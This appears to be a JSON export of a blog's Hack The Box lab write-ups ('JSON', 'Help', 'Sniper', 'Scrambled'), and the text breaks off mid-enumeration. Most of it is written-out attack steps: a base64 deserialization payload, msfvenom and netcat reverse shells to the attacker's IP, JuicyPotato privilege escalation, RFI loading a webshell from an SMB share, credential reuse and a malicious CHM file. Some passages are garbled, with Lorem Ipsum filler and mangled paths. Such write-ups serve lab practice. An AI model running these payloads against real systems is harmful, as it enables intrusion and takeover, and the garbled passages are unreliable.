T0RsZFhRWU1BQUFBUzIxelkyOXliR2xpTENCV1pYSnphVzl1UFRRdU1DNHdMakFzSUVOMWJIUjFjbVU5Ym1WMWRISmhiQ3dnVUhWaWJHbGpTMlY1Vkc5clpXNDlZamMzWVRWak5UWXhPVE0wWlRBNE9Rb0dEUUFBQUVsVGVYTjBaVzBzSUZabGNuTnBiMjQ5TkM0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMWlOemRoTldNMU5qRTVNelJsTURnNUJnNEFBQUFhVTNsemRHVnRMa1JwWVdkdWIzTjBhV056TGxCeWIyTmxjM01HRHdBQUFBVlRkR0Z5ZEFrUUFBQUFCQWtBQUFBdlUzbHpkR1Z0TGxKbFpteGxZM1JwYjI0dVRXVnRZbVZ5U1c1bWIxTmxjbWxoYkdsNllYUnBiMjVJYjJ4a1pYSUhBQUFBQkU1aGJXVU1RWE56WlcxaWJIbE9ZVzFsQ1VOc1lYTnpUbUZ0WlFsVGFXZHVZWFIxY21VS1UybG5ibUYwZFhKbE1ncE5aVzFpWlhKVWVYQmxFRWRsYm1WeWFXTkJjbWQxYldWdWRITUJBUUVCQVFBRENBMVRlWE4wWlcwdVZIbHdaVnRkQ1E4QUFBQUpEUUFBQUFrT0FBQUFCaFFBQUFBK1UzbHpkR1Z0TGtScFlXZHViM04wYVdOekxsQnliMk5sYzNNZ1UzUmhjblFvVTNsemRHVnRMbE4wY21sdVp5d2dVM2x6ZEdWdExsTjBjbWx1WnlrR0ZRQUFBRDVUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM011VUhKdlkyVnpjeUJUZEdGeWRDaFRlWE4wWlcwdVUzUnlhVzVuTENCVGVYTjBaVzB1VTNSeWFXNW5LUWdBQUFBS0FRb0FBQUFKQUFBQUJoWUFBQUFIUTI5dGNHRnlaUWtNQUFBQUJoZ0FBQUFOVTNsemRHVnRMbE4wY21sdVp3WVpBQUFBSzBsdWRETXlJRU52YlhCaGNtVW9VM2x6ZEdWdExsTjBjbWx1Wnl3Z1UzbHpkR1Z0TGxOMGNtbHVaeWtHR2dBQUFESlRlWE4wWlcwdVNXNTBNeklnUTI5dGNHRnlaU2hUZVhOMFpXMHVVM1J5YVc1bkxDQlRlWE4wWlcwdVUzUnlhVzVuS1FnQUFBQUtBUkFBQUFBSUFBQUFCaHNBQUFCeFUzbHpkR1Z0TGtOdmJYQmhjbWx6YjI1Z01WdGJVM2x6ZEdWdExsTjBjbWx1Wnl3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaE5XTTFOakU1TXpSbE1EZzVYVjBKREFBQUFBb0pEQUFBQUFrWUFBQUFDUllBQUFBS0N3PT0nCiAgICAgICAgICAgICAgICB9’\nmsf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.14.8:4400 [*] Sending stage (206403 bytes) to 10.10.10.158 [*] Meterpreter session 4 opened (10.10.14.8:4400 -&gt; 10.10.10.158:55588) at 2020-01-24 09:18:51 +0100\nmeterpreter &gt; shell Process 2464 created. Channel 1 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved.\nc:&gt; whoami json\n\nGrab user.txt\nC:&gt;type user.txt 3445****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nLooking at our users privileges we notice that SeImpersonatePrivilege is enabled. This would allow us to use JuicyPotato for privilege escalation.\nc:Files (x86)Server&gt;whoami /priv\nPRIVILEGES INFORMATION ———————-\nPrivilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled\nUpload JuicyPotato.exe to the victim machine. C:&gt;copy \\10.10.14.8-share.exe .\nCreate a malicious payload to execute a reverse shell. root@p3:/opt/htb/machines/json# msfvenom -p cmd/windows/reverse_powershell lhost=10.10.14.8 lport=4499 &gt; json-privesc.bat [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder or badchars specified, outputting raw payload Payload size: 1223 bytes\nroot@p3:/opt/htb/machines/json# cp json-privesc.bat /srv/pub-share/ root@p3:/opt/htb/machines/json# chmod +x /srv/pub-share/json-privesc.bat\nGrab a random CLSID from JuicyPotato’s GitHub, start netcat, and execute your exploit.\nC:&gt;JuicyPotato.exe -l 1444 -p c:.exe -a “/c \\10.10.14.8-share-privesc.bat” -t * -c {eff7f153-1c97-417a-b633-fede6683a939} Testing {eff7f153-1c97-417a-b633-fede6683a939} 1444 …. [+] authresult 0 {eff7f153-1c97-417a-b633-fede6683a939};NT AUTHORITY\n[+] CreateProcessWithTokenW OK\nroot@p3:/opt/htb/machines/json# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.8] from (UNKNOWN) [10.10.10.158] 49686 Microsoft Windows [Version 6.3.9600]\n\n2013 Microsoft Corporation. All rights reserved.\n\nC:&gt;whoami nt authority C:&gt;type root.txt 3cc85d1bed2ee84af4074101b991d441\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nysoserial.net https://github.com/Lexus89/ysoserial.net https://github.com/pwntester/ysoserial.net https://github.com/frohoff/ysoserial (For Java applications) https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-014/-cyberark-password-vault-web-access-remote-code-execution https://www.kitploit.com/2017/11/ysoserialnet-deserialization-payload.html https://book.hacktricks.xyz/pentesting-web/unserialization\nJuicyPotato https://github.com/ohpe/juicy-potato https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter"
  },
  {
    "objectID": "posts/2019-04-17-htb-writeup-help/2019-04-17-htb-writeup-help.html",
    "href": "posts/2019-04-17-htb-writeup-help/2019-04-17-htb-writeup-help.html",
    "title": "Help - Hack The Box",
    "section": "",
    "text": "No writeup available.."
  },
  {
    "objectID": "posts/2019-11-20-htb-writeup-sniper/2019-11-20-htb-writeup-sniper.html",
    "href": "posts/2019-11-20-htb-writeup-sniper/2019-11-20-htb-writeup-sniper.html",
    "title": "Sniper - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n -O sniper.htb PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\nHost script results: |clock-skew: 7h00m12s | smb2-security-mode: | 2.02: | Message signing enabled but not required | smb2-time: | date: 2019-11-20T16:04:55 |_ start_date: N/A\n\nnmap -Pn -sV -n -p- sniper.htb PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windowhis netbios-ssn 445/tcp open microsoft-ds? 49667/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nEnumeration with dirb and nikto finds.. .. Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST\nContinue enumeration by browsing the website and we find http://sniper.htb/blog/?lang=blog-en.php ?lang=xxx looks like it could be vulnerable by RFI. Reading up on RFI a common way is to setup a local SMB share and fetch a webshell - lets try that!\nroot@p3:~# vi /etc/samba/smb.conf\n[pub-share] Comment = SMB Drops path = /srv/pub-share writable = yes guest ok = yes read only = no force user = nobody\nroot@p3:~# service smbd restart\nMake sure that the share is reachable: root@p3:/srv/pub-share# smbclient //10.10.14.10/pub-share Enter WORKGROUP’s password: Try “help” to get a list of possible commands. smb: &gt; ls . D 0 Fri Nov 22 11:57:22 2019 .. D 0 Fri Nov 22 10:57:42 2019 sniper-rev.php N 94 Fri Nov 22 09:50:24 2019 nc64.exe N 45272 Wed Nov 20 15:16:38 2019 webshell.php N 7206 Fri Nov 22 11:00:15 2019\n     554197528 blocks of size 1024. 501299668 blocks available\nExecute RFI and connect to webshell.php for Initial Foothold. http://sniper.htb/blog/?lang=//10.10.14.10/pub-share/webshell.php whoami nt authority\nPoking around in the box we find db.php (C:) type db.php \nOur first pair of creds - dbuser:36mEAhz/B8xQ~2VM for MYSQL database sniper\nLooking for users we find 2 accounts, Administrator and Chris. However we don’t have permissions to enter any of them. dir Directory of C:/11/2019 06:04 AM\n\n. 04/11/2019 06:04 AM\n\n.. 04/09/2019 05:47 AM\n\nAdministrator 04/11/2019 06:04 AM\n\nChris 04/09/2019 05:47 AM\n\nPublic 0 File(s) 0 bytes 5 Dir(s) 17,963,245,568 bytes free\nVerify the account using rpcclient root@p3:/opt/shells# rpcclient -U chris sniper.htb Enter WORKGROUP’s password: (36mEAhz/B8xQ~2VM) rpcclient $&gt;\nNOTE: Looks like Chris is re-using his password. Working creds - Chris:36mEAhz/B8xQ~2VM\nSpawn an interactive reverse powershell from your webshell by calling netcat for windows. Download netcat 1.12: https://eternallybored.org/misc/netcat/\nroot@p3:/opt/htb/machines/sniper# unzip netcat-win32-1.12.zip /nc64 root@p3:/opt/htb/machines/sniper# cp nc64/nc64.exe /srv/pub-share root@p3:/opt/htb/machines/sniper# chmod +x /srv/pub-share/nc64.exe\nFrom Webshell: //10.10.14.10/pub-share/nc64.exe 10.10.14.10 4488 -e powershell\nroot@p3:/opt/htb/machines/sniper# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 49908 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt; whoami whoami nt authority PS C:&gt; $env:computername $env:computername SNIPER\nChange user from iusr to Chris by setting up another reverse shell, using the found creds.\nAssign the credentials: PS C:&gt; $user = ‘sniper.htb’ PS C:&gt; $pass = ‘36mEAhz/B8xQ~2VM’ | ConvertTo-SecureString -AsPlainText -Force PS C:&gt; \\(creds = New-Object System.Management.Automation.PSCredential(\\)user,$pass)\nTest to make sure it works by sending single command to the “remote” host: PS C:&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami } sniper\nSetup a new reverse shell as Chris: PS C:&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { //10.10.14.10/pub-share/nc64.exe 10.10.14.10 4499 -e powershell }\nroot@p3:/opt/htb/machines/sniper# nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 50014 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt; whoami whoami sniper\nGrab user.txt PS C:&gt; type user.txt type user.txt 21f4****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nLooking around in the box we find a file named instructions.chm in C:. Lets download it and view the file.\nPS C:&gt; Copy-Item -Path instructions.chm -Destination //10.10.14.10/pub-share/instructions.chm root@p3:/srv/pub-share# mv instructions.chm /opt/htb/machines/sniper/ root@p3:/opt/htb/machines/sniper# xchm instructions.chm\n\nSniper Android App Documentation Table of Contents Pff… This dumb CEO always makes me do all the shitty work. SMH! I’m never completing this thing. Gonna leave this place next week. Hope someone snipes him.\n\n\nMaybe we are looking for an app for privesc?\n\nIn C:we find note.txt and “php for dummies-trial.pdf”, lets view them.\nPS C:&gt; type note.txt Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you’ve prepared the documentation for our new app. Drop it here when you’re done with it. Regards, Sniper CEO.\nPS C:&gt; Copy-Item -Path “php for dummies-trial.pdf”-Destination //10.10.14.10/pub-share/test.pdf root@p3:/srv/pub-share# mv test.pdf /opt/htb/machines/sniper/php-dummies.pdf\nThe PDF only contains table of content, and no actual content.\nCHM-files are deemed as dangerous as they can be injected with malicious code. We can compile our own (malicious) .chm-file using only Windows tools (HTML Help). Let’s start by creating the three files needed; .htm, .hhc and .hhp\n.htm - this is our payload where we inject the malicious data .hhc - contains the Table of Content for the HTML Help file .hhp - our project file used to bind all the other files together\nroot@p3:/opt/htb/machines/sniper# cat expl.htm\n\n\n\n&lt;p&gt;Bypass AV by PlayerThree&lt;/p&gt;\n\n\n\n     \n\n\nBypass AV by PlayerThree\n\n\n\nroot@p3:/opt/htb/machines/sniper# cat expl.hhc &lt;!DOCTYPE HTML PUBLIC “-//IETF//DTD HTML//EN”&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n \n\n\n\n\nroot@p3:/opt/htb/machines/sniper# cat expl.hhp [OPTIONS] Compatibility=1.1 or later Compiled file=expl.chm Contents file=expl.hhc Default topic=expl.htm Display compile progress=No Language=0x409 English (United States)\n[FILES] C:.htm\nWhen all files are created we need to switch over to a Windows-box and compile it ’m in with chris shell. I guess I have to explote this vulnerability “Microsoft Compiled HTML Help / Uncompiled .chm File - XML External Entity Injection”, but i don’t get success with my .chm file, i’m in the right placdo the .chm-file. C:&gt; “C:Files (x86)Help Workshop.exe” expl.hpp Microsoft HTML Help Compiler 4.74.8702\nCompiling C:.chm\nCompile time: 0 minutes, 1 second 1 Topics 0 Local links 0 Internet links 0 Graphics\nCreated C:.chm, 10835 bytes Compression decreased file by 10835 bytes.\nUpload our malicious chm-file to sniper.htb c:, as hinted in note.txt (Drop it here when you’re done with it.), and quickly run the file to execute the payload. Grab root.txt. PS C:&gt; copy //10.10.14.10/pub-share/nc64.exe nc64.exe PS C:&gt; copy //10.10.14.10/pub-share/expl.chm expl.chm PS C:&gt; ..chm\nroot@p3:/opt/htb/machines/sniper# nc -lvnp 4400 listening on [any] 4400 … connect to [10.10.14.10] from (UNKNOWN) [10.10.10.151] 49681 Microsoft Windows [Version 10.0.17763.678]\n\n2018 Microsoft Corporation. All rights reserved.\n\nC:&gt;whoami sniper C:&gt;type root.txt 5624****************************\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nRFI + SMB https://medium.com/@minimalist.ascent/remote-file-include-using-samba-shares-6fa76dfeb4ce http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html\nnc64.exe https://www.youtube.com/watch?v=PJXb2pK8K84&t=1155 (found by searching for ‘windows reverse’ on https://ippsec.rocks/)\nChange user https://social.technet.microsoft.com/Forums/lync/en-US/e8452304-06db-45ab-961e-2c4ef3fa2a12/enter-username-and-password-using-powershell?forum=winserverpowershell https://www.howtogeek.com/117192/how-to-run-powershell-commands-on-remote-computers/\nGood random commands powershell -ep bypass runas /user:snipercmd.exe\nMalicious .chm-file https://github.com/arntsonl/calc_security_poc/tree/master/chm https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7"
  },
  {
    "objectID": "posts/2022-09-16-htb-writeup-scrambled/2022-09-16-htb-writeup-scrambled.html",
    "href": "posts/2022-09-16-htb-writeup-scrambled/2022-09-16-htb-writeup-scrambled.html",
    "title": "Scrambled - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1 - Basic enumeration\nnmap:\n➜  scrambled nmap -Pn -n -p- 10.10.11.168\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n1433/tcp  open  ms-sql-s\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n4411/tcp  open  found\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49667/tcp open  unknown\n49673/tcp open  unknown\n49674/tcp open  unknown\n49700/tcp open  unknown\n49704/tcp open  unknown\n\n\n➜  scrambled nmap -Pn -n -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49700,49704 10.10.11.168\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Scramble Corp Intranet\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-15 07:32:05Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2022-09-15T07:35:12+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2022-06-09T15:30:57\n|_Not valid after:  2023-06-09T15:30:57\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2022-06-09T15:30:57\n|_Not valid after:  2023-06-09T15:30:57\n|_ssl-date: 2022-09-15T07:35:12+00:00; 0s from scanner time.\n1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2022-09-15T07:27:07\n|_Not valid after:  2052-09-15T07:27:07\n|_ssl-date: 2022-09-15T07:35:12+00:00; 0s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2022-06-09T15:30:57\n|_Not valid after:  2023-06-09T15:30:57\n|_ssl-date: 2022-09-15T07:35:12+00:00; 0s from scanner time.\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC1.scrm.local\n| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local\n| Not valid before: 2022-06-09T15:30:57\n|_Not valid after:  2023-06-09T15:30:57\n|_ssl-date: 2022-09-15T07:35:12+00:00; 0s from scanner time.\n4411/tcp  open  found?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: \n|     SCRAMBLECORP_ORDERS_V1.0.3;\n|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: \n|     SCRAMBLECORP_ORDERS_V1.0.3;\n|_    ERROR_UNKNOWN_COMMAND;\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n49667/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49700/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\n\nHost script results:\n| smb2-security-mode: \n|   3.1.1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-09-15T07:34:34\n|_  start_date: N/A\n| ms-sql-info: \n|   10.10.11.168:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\nport 80: \nUnder the tab IT Services we find this message: &gt; “04/09/2021: Due to the security breach last month we have now disabled all NTLM authentication on our network. This may cause problems for some of the programs you use so please be patient while we work to resolve any issues”\n/supportrequest.html gives us few more details:\n\nDial extension 0866 to reach support, might be useful if there are any VoIP elements\nSupport email is support@scramblecorp.com add domain to /etc/hosts\nWe also find the user ksimpson from the cmd image:\n\n\nWe can request a user account for new employees at /newuser.html, this might be a possible vector for XSS/CSRF/SSRF attacks.\n/salesorders.html shows us how to enable debugging for the sales order app. Possible that we can extract sensitive information from the app.\n/passwords.html gives us a huge piece of information, passwords might be set to be the same as username:\n\n“Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.”\n\nport 4411: This port stands out and isn’t anything standard. We’re able to connect to it unauthenticated but we don’t know any commands available.\n➜  scrambled nc 10.10.11.168 4411\nSCRAMBLECORP_ORDERS_V1.0.3;\nhelp\nERROR_UNKNOWN_COMMAND;\nHELP\nERROR_UNKNOWN_COMMAND;\nh\nERROR_UNKNOWN_COMMAND;\n?\nERROR_UNKNOWN_COMMAND;\nlist\nERROR_UNKNOWN_COMMAND;\nshow\nERROR_UNKNOWN_COMMAND;\ndir\nLets move on and keep this port in mind for a later stage.\nport 139/445:\n➜  scrambled rpcclient -U \"\" 10.10.11.168\nEnter WORKGROUP\\'s password: \nCannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED\n\n➜  scrambled rpcclient -U ksimpson 10.10.11.168\nEnter WORKGROUP\\ksimpsons password: \nCannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED\n\n➜  scrambled nbtscan -r 10.10.11.168\nDoing NBT name scan for addresses from 10.10.11.168\nIP address       NetBIOS Name     Server    User             MAC address      \n------------------------------------------------------------------------------\n\n➜  scrambled smbclient -L 10.10.11.168\nEnter WORKGROUP\\void password: \nsession setup failed: NT_STATUS_NOT_SUPPORTED\n\n➜  scrambled smbclient -U ksimpson -L 10.10.11.168\nEnter WORKGROUP\\ksimpsons password: \nsession setup failed: NT_STATUS_NOT_SUPPORTED\n\n➜  scrambled smbmap -H 10.10.11.168\n[!] Authentication error on 10.10.11.168\n\n➜  scrambled smbmap -H 10.10.11.168\n[!] Authentication error on 10.10.11.168\n\n➜  scrambled crackmapexec smb 10.10.11.168 -u '' -p '' --shares\nSMB         10.10.11.168    445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)\nSMB         10.10.11.168    445    NONE             [-] \\: STATUS_NOT_SUPPORTED \nSMB         10.10.11.168    445    NONE             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)\nport 135:\n➜  scrambled impacket-rpcdump 10.10.11.168 &gt; rpcdump.out\n➜  scrambled cat rpcdump.out| grep -i pipe        \n          ncacn_np:\\\\DC1[\\PIPE\\InitShutdown]\n          ncacn_np:\\\\DC1[\\PIPE\\InitShutdown]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\eventlog]\n          ncacn_np:\\\\DC1[\\pipe\\26bddf8e29d9b793]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\26bddf8e29d9b793]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\26bddf8e29d9b793]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\26bddf8e29d9b793]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\26bddf8e29d9b793]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\pipe\\lsass]\n          ncacn_np:\\\\DC1[\\PIPE\\atsvc]\n          ncacn_np:\\\\DC1[\\PIPE\\atsvc]\n          ncacn_np:\\\\DC1[\\PIPE\\atsvc]\n          ncacn_np:\\\\DC1[\\PIPE\\atsvc]\n          ncacn_np:\\\\DC1[\\PIPE\\atsvc]\n          ncacn_np:\\\\DC1[\\PIPE\\wkssvc]\n          ncacn_np:\\\\DC1[\\pipe\\tapsrv]\n          ncacn_np:\\\\DC1[\\PIPE\\ROUTER]\n          ncacn_np:\\\\DC1[\\pipe\\cert]\nReading on HackTricks \\pipe\\atsvc is listed as Notable RPC interfaces with the description “Task scheduler, used to remotely execute commands”. Verifying with the IFID value we can confirm that the Task Scheduler is exposed:\n➜  scrambled grep -ia2 \"1ff70682-0a51-30e8-076d-740be8cee98b\" rpcdump.out\nProtocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol \nProvider: taskcomp.dll \nUUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 \nBindings: \n          ncacn_np:\\\\DC1[\\PIPE\\atsvc]\nTrying to continue down this road I get stuck and I’m unable to bind using NCACN_IP_TCP, lets move on.\n➜  scrambled impacket-rpcmap 'ncacn_ip_tcp:10.10.11.168'    \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[-] Protocol failed: Bind context rejected: invalid_checksum\nport 389/636/3268/3269:\n➜  scrambled ldapsearch -x -H ldap://10.10.11.168 -D '' -w '' -b \"DC=scrm,DC=local\"\n# extended LDIF\n#\n# LDAPv3\n# base &lt;DC=scrm,DC=local&gt; with scope subtree\n# filter: (objectclass=*)\n# requesting: ALL\n#\n\n# search result\nsearch: 2\nresult: 1 Operations error\ntext: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera\n tion a successful bind must be completed on the connection., data 0, v4563\n\n# numResponses: 1\n\n\n➜  scrambled 